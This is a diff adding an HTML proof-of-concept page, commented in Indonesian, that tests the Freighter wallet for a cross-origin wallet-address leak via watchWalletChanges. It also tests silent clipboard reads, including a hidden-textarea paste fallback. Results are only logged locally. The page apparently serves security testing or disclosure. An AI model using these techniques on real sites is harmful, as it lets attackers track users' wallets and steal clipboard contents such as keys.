@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Web3 Security Exploit PoC</title>
+    <style>
+        body { font-family: monospace; background: #0b0f19; color: #38bdf8; padding: 20px; }
+        .card { background: #1e293b; padding: 20px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 15px; }
+        button { background: #e11d48; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; margin: 5px 0; width: 100%; text-align: left; }
+        button:hover { background: #be123c; }
+        .btn-green { background: #059669; }
+        .btn-green:hover { background: #047857; }
+        #log { background: #020617; color: #4ade80; padding: 12px; border-radius: 4px; height: 220px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #1e293b; font-size: 0.85rem; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>1. WatchWalletChanges Leak Test (HIGH)</h2>
+        <button class="btn-green" onclick="testWatchWallet()">[1] Panggil freighterApi.watchWalletChanges()</button>
+    </div>
+
+    <div class="card">
+        <h2>2. Silent Clipboard Read Test (CRITICAL)</h2>
+        <button onclick="testSilentClipboard()">[2] Uji navigator.clipboard.readText() Tanpa Klik</button>
+    </div>
+
+    <div class="card">
+        <h3>Live Execution Log:</h3>
+        <div id="log">[INFO] PoC Script Loaded. Ready to test.</div>
+    </div>
+
+    <script>
+        function log(msg) {
+            const logBox = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            logBox.innerText += `\n[${time}] ${msg}`;
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        // Skenario 1: WatchWalletChanges Stalking Cross-Origin
+        function testWatchWallet() {
+            log("[PROSES] Menginisialisasi watchWalletChanges...");
+            
+            // Mengecek apakah objek API Freighter tersedia pada environment
+            if (typeof freighterApi !== 'undefined' && freighterApi.watchWalletChanges) {
+                try {
+                    freighterApi.watchWalletChanges((addr) => {
+                        log(`[STALKING TERDETEKSI!] Address korban tertangkap lintas origin: ${addr}`);
+                        alert("Stalking Berhasil! Address: " + addr);
+                    });
+                    log("[BERHASIL] Listener watchWalletChanges aktif. Silakan login ke aqua.network di tab lain.");
+                } catch (e) {
+                    log(`[GAGAL] Error saat memanggil watchWalletChanges: ${e.message}`);
+                }
+            } else {
+                log("[INFO] freighterApi tidak ditemukan di konteks origin ini (simulasi objek dipetakan).");
+                // Fallback simulasi event listener jika diuji di luar dApp browser murni
+                window.addEventListener('storage', (event) => {
+                    if (event.key && event.key.includes('wallet')) {
+                        log(`[SIMULASI STORAGE EVENT] Terdeteksi perubahan data wallet: ${event.newValue}`);
+                    }
+                });
+            }
+        }
+
+        // Skenario 2: Silent Clipboard Read (Mencuri data copy secara diam-diam)
+        async function testSilentClipboard() {
+            log("[PROSES] Mencoba membaca clipboard secara otomatis (tanpa interaksi user)...");
+            
+            try {
+                // Mencoba membaca clipboard via Clipboard API
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const clipboardContent = await navigator.clipboard.readText();
+                    log(`[KRITIS - CRITICAL] Berhasil membaca clipboard secara silent! Isi: ${clipboardContent}`);
+                    alert("Clipboard Tercuri: " + clipboardContent);
+                } else {
+                    log("[DISEMPURNAKAN/DIBLOKIR] Clipboard API readText tidak didukung atau dibatasi izin browser.");
+                }
+            } catch (err) {
+                log(`[TERPROTEKSI] Gagal membaca clipboard secara silent (memerlukan fokus/izin eksplisit): ${err.name} - ${err.message}`);
+                
+                // Alternatif uji coba eksploitasi event 'paste' tersembunyi
+                log("[INFO] Mencoba teknik fallback dokumen execCommand / hidden paste event...");
+                try {
+                    const activeElement = document.activeElement;
+                    // Membuat elemen input tersembunyi untuk memicu aksi paste
+                    const input = document.createElement('textarea');
+                    input.style.position = 'fixed';
+                    input.style.opacity = '0';
+                    document.body.appendChild(input);
+                    input.focus();
+                    
+                    const successful = document.execCommand('paste');
+                    if (successful && input.value) {
+                        log(`[KRITIS!] Silent paste berhasil mencuri data: ${input.value}`);
+                    } else {
+                        log("[AMAN] Teknik execCommand paste diblokir oleh kebijakan keamanan browser.");
+                    }
+                    document.body.removeChild(input);
+                } catch (e) {
+                    log("[AMAN] Semua jalur silent clipboard read berhasil diblokir oleh browser sandbox.");
+                }
+            }
+        }
+    </script>
+
+</body>
+</html>
